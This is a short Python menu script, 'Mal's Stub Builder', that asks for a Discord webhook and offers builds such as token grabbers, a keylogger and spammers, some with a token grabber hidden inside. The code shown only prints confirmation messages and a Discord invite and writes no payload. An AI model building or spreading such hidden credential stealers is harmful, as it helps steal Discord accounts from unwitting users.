import time
from time import sleep
import sys
import pyfiglet
from serverlink import disc

# Made by Mal

# banner
banner = pyfiglet.figlet_format("Mal's Stub Builder v1.0.0")
print(banner)

# webhook
print("Please Insert Your WebHook URL:")
web = input()

# file name
print("Please insert the name of your files you will create:")
name = input()

# token grabber boolean
print("Type: Y/N  (Non Token Grabber or with hidden Token Grabber)")
non = input().lower()

# Options to build
print('''

    ##########################################################################
                        https://discord.gg/qqExcWPkJ4
                                | MADE BY MAL |  
                                
            <All files have 2 versions (Token Grabber & Non Token Grabber)>
            
                    Option 1: Token Gen       
                    Option 2: Webhook Spammer
                    Option 3: PRO Token Grabber
                    Option 4: Token Grabber
                    Option 5: Spammer
                    Option 6: Nitro Gen+Checker
                    Option 7: Proxy Scraper
                    Option 8: Email Scraper
                    Option 9: KeyLogger
                    Option 10: GiftCard Gen
                    Option 11: Nitro Sniper
                    Option 12: Token Logger
                    
                                | MADE BY MAL |
                        https://discord.gg/qqExcWPkJ4                                   
    ###########################################################################
    
''')

# Option to build
print("Insert what option you want to Build:")
build = input()

# Options variables
OP_1 = 'has been saved as Token Gen.py'
OP_2 = 'has been saved as Webhook Spammer.py'
OP_3 = 'has been saved as Plain_Tok3n_Grabber.py'
OP_4 = 'has been saved as Token Grabber.py'
OP_5 = 'has been saved as Spammer.py'
OP_6 = 'has been saved as Nitro Gen+checker.py'
OP_7 = 'has been saved as ProxyScraper.py'
OP_8 = 'has been saved as EmailScraper.py'
OP_9 = 'has been saved as KeyLogger.py'
OP_10 = 'has been saved as GiftCard_Gen.py'
OP_11 = 'has been saved as Nitro Sniper.py'
OP_12 = 'has been saved as Token Logger.txt'

# Option Response
if build == '1':
    print("Your Build " + OP_1 + '\n' + disc)

elif build == '2':
    print("Your Build " + OP_2 + '\n' + disc)

elif build == '3':
    print("Your Build " + OP_3 + '\n' + disc)

elif build == '4':
    print("Your Build " + OP_4 + '\n' + disc)

elif build == '5':
    print("Your Build " + OP_5 + '\n' + disc)

elif build == '6':
    print("Your Build " + OP_6 + '\n' + disc)

elif build == '7':
    print("Your Build " + OP_7 + '\n' + disc)

elif build == '8':
    print("Your Build " + OP_8 + '\n' + disc)

elif build == '9':
    print("Your Build " + OP_9 + '\n' + disc)

elif build == '10':
    print("Your Build " + OP_10 + '\n' + disc)

elif build == '11':
    print("Your Build " + OP_11 + '\n' + disc)

elif build == '12':
    print("Your Build " + OP_12 + '\n' + disc)

# anything else entered that is invalid
else:
    print('\n' + "Invalid Option")
    print("Need help?: " + disc)
    time.sleep(1)
    exit()